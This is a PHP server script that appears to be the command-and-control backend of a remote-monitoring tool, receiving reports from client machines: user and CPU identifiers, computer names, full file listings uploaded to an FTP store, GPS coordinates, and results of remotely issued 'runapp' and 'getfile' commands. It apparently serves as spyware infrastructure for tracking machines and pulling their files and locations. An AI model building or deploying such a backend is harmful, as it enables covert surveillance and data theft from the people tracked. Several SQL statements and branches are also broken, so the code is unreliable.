<?php
require_once("sn-config.php");
require_once("sn-function.php");
$nowtime=date('Y-m-d H:i:s', time());
if(isset($_POST["act"])) {
	if($_POST["act"] == "updatepcinfo" && check_token($_POST["token"]) == true) {
		if($_POST["user"]!=NULL && $_POST["cpuid"]!=NULL && $_POST["pcname"]!=NULL && $_POST["filelist"]!=NULL && $_POST["more"]!=NULL) {
			$user    =mysqli_real_escape_string($conn,htmlentities($_POST["user"], ENT_QUOTES));
			$cpuid   =mysqli_real_escape_string($conn,htmlentities($_POST["cpuid"], ENT_QUOTES));
			$pcname  =mysqli_real_escape_string($conn,htmlentities($_POST["pcname"], ENT_QUOTES));
			$filelist=$_POST["filelist"];
			$more    =mysqli_real_escape_string($conn,htmlentities($_POST["more"], ENT_QUOTES));
			$ngay    =date('Y-m-d H:i:s', time());
			//echo "$user $cpuid $pcname $more $ngay \n";
			//$filelist="";
			$sql = "SELECT * FROM pcinfo where user=`".$user."` and cpuid=`".$cpuid."` limit 1";
			$query=mysqli_query($conn,$sql);
			if(!$query) {
				$sql = "INSERT IGNORE INTO pcinfo (user,cpuid,pcname,filelist,more,timeget) values ('$user','$cpuid','$pcname','$FTPServerNum','$more','$ngay')";
				//echo $sql;
				$query=mysqli_query($conn,$sql);
				if(!$query){
					writelog("INSERT_PCINFO_ERROR:".mysqli_error($conn), $user, $cpuid);
					die("INSERT_PCINFO_ERROR");
				}
				else {
					$sql = "UPDATE pcinfo set pcname='$pcname',more='$more',timeget='$ngay' where user='$user' and cpuid='$cpuid'";
					$query=mysqli_query($conn,$sql);
					if(!$query) {
						writelog("UPDATE_PCINFO_ERROR_CANT_UPDATE:".mysqli_error($conn), $user, $cpuid);
						exit("UPDATE_PCINFO_ERROR_CANT_UPDATE");
					}
					// Thiết lập kết nối FTP tới server lưu trữ
					$FTP_connid = ftp_connect($StoreServerFTP[$FTPServerNum]["server"]); 
					// Đăng nhập
					$FTPlogin_result = ftp_login($FTP_connid, $StoreServerFTP[$FTPServerNum]["user"], $StoreServerFTP[$FTPServerNum]["password"]); 
					// Kiểm tra kết nối
					if ((!$FTP_connid) || (!$FTPlogin_result)) { 
						writelog("INSERT_PCINFO_SUCCESS_WITHOUT_FILELOG_CONNECT".error_get_last(), $user, $cpuid);
						die("INSERT_PCINFO_SUCCESS_WITHOUT_FILELOG_CONNECT");
					} else {
						$filecreate="ftp://".$StoreServerFTP[$FTPServerNum]["user"] . ":" . $StoreServerFTP[$FTPServerNum]["password"] . "@" . $StoreServerFTP[$FTPServerNum]["server"] . "/htdocs/" . $user."-".$cpuid;
						/* create a stream context telling PHP to overwrite the file */ 
						$options = array('ftp' => array('overwrite' => true)); 
						$stream = stream_context_create($options); 
						/* and finally, put the contents */ 
						file_put_contents($filecreate, utf8_encode($filelist), 0, $stream); 
						writelog("INSERT_PCINFO_SUCCESS_WITH_FILELOG:".$FTPServerNum, $user, $cpuid);
						echo($FTPServerNum);
						exit();
					}
				}
			}
			else {
				$sql = "UPDATE pcinfo set pcname=`$pcname`,more=`$more`,timeget='$ngay') where user=`$user` and cpuid=`$cpuid`";
				$query=mysqli_query($conn,$sql);
				if(!$query) {
					writelog("UPDATE_PCINFO_ERROR", $user, $cpuid);
					die("UPDATE_PCINFO_ERROR:".mysqli_error($conn));
				}
				else {
					writelog("UPDATE_PCINFO_SUCCESS", $user, $cpuid);
					die("UPDATE_PCINFO_SUCCESS");
				}
			}
		}
	}
	elseif($_POST["act"] == "updateonline" && check_token($_POST["token"]) == true) {
		if($_POST["user"]!=NULL && $_POST["cpuid"]!=NULL) {
			$user    =mysqli_real_escape_string($conn,htmlentities($_POST["user"], ENT_QUOTES));
			$cpuid   =mysqli_real_escape_string($conn,htmlentities($_POST["cpuid"], ENT_QUOTES));
			$ngay    =date('Y-m-d H:i:s', time());
			$sql = "UPDATE pcinfo set timeget='$ngay' where user='$user' and cpuid='$cpuid'";
			$query=mysqli_query($conn, $sql);
			if($query){
				writelog("UPDATE_ONLINE_SUCCESS", $user, $cpuid);
				die("UPDATE_ONLINE_SUCCESS");
			}
			else{
				writelog("UPDATE_ONLINE_ERROR", $user, $cpuid);
				die("UPDATE_ONLINE_ERROR:".mysqli_error($conn));
			}
		}
	}
	elseif($_POST["act"] == "updatelocation" && check_token($_POST["token"]) == true) {
		if($_POST["user"]!=NULL && $_POST["cpuid"]!=NULL && $_POST["latitude"]!=NULL && $_POST["longitude"]!=NULL) {
			$user      = mysqli_real_escape_string($conn,htmlentities($_POST["user"], ENT_QUOTES));
			$cpuid     = mysqli_real_escape_string($conn,htmlentities($_POST["cpuid"], ENT_QUOTES));
			$latitude  = mysqli_real_escape_string($conn,htmlentities($_POST["latitude"], ENT_QUOTES));
			$longitude = mysqli_real_escape_string($conn,htmlentities($_POST["longitude"], ENT_QUOTES));
			$ngay    =date('Y-m-d H:i:s', time());
			$sql = "INSERT INTO vitri (user,cpuid,timeget,longitude,latitude) values ('$user', '$cpuid', '$ngay', '$longitude', '$latitude')";
			$query=mysqli_query($conn, $sql);
			if($query) {
				writelog("UPDATE_LOCATION_SUCCESS", $user, $cpuid);
				die("UPDATE_LOCATION_SUCCESS");
			}
			else{
				writelog("UPDATE_LOCATION_ERROR", $user, $cpuid);
				die("UPDATE_LOCATION_ERROR");
			}
		}
	}
	elseif($_POST["act"] == "updatequeryinfo" && check_token($_POST["token"]) == true) {
		if($_POST["querytype"] == "runapp") {
			$queryid = mysqli_real_escape_string($conn,htmlentities($_POST["queryid"], ENT_QUOTES));
			$user      = mysqli_real_escape_string($conn,htmlentities($_POST["user"], ENT_QUOTES));
			$cpuid     = mysqli_real_escape_string($conn,htmlentities($_POST["cpuid"], ENT_QUOTES));
			$sql = "UPDATE lenh set result='1',timeexcute='".$nowtime."' where id='$queryid'";
			$query = mysqli_query($conn, $sql);
			if($query) {
				writelog("UPDATE_QUERY_SUCCESS:".$queryid, $user, $cpuid);
				die("UPDATE_QUERY_SUCCESS");
			}
			else {
				writelog("UPDATE_QUERY_ERROR:".mysqli_error($conn), $user, $cpuid);
				die("UPDATE_QUERY_ERROR");
			}
		}
		elseif($_POST["querytype"] == "getfile") {
			$queryid = mysqli_real_escape_string($conn,htmlentities($_POST["queryid"], ENT_QUOTES));
			$result = mysqli_real_escape_string($conn,htmlentities($_POST["result"], ENT_QUOTES));
			$user      = mysqli_real_escape_string($conn,htmlentities($_POST["user"], ENT_QUOTES));
			$cpuid     = mysqli_real_escape_string($conn,htmlentities($_POST["cpuid"], ENT_QUOTES));
			
			$sql = "UPDATE lenh set result='$result',timeexcute='".$nowtime."' where id='$queryid'";
			$query = mysqli_query($conn, $sql);
			if($query && fileExistsFTPStore($StoreServerFTP[$FTPServerNum]["server"],$StoreServerFTP[$FTPServerNum]["user"], $StoreServerFTP[$FTPServerNum]["password"], $result)) {
				writelog("UPDATE_QUERY_SUCCESS:".$queryid, $user, $cpuid);
				die("UPDATE_QUERY_SUCCESS");
			}
			else {
				writelog("UPDATE_QUERY_ERROR:".mysqli_error($conn), $user, $cpuid);
				die("UPDATE_QUERY_ERROR");
			}
		}
	}
	elseif($_POST["act"] == "updateerrorquery" && check_token($_POST["token"]) == true) {
			
	}
}

require_once("sn-cc.php");
?>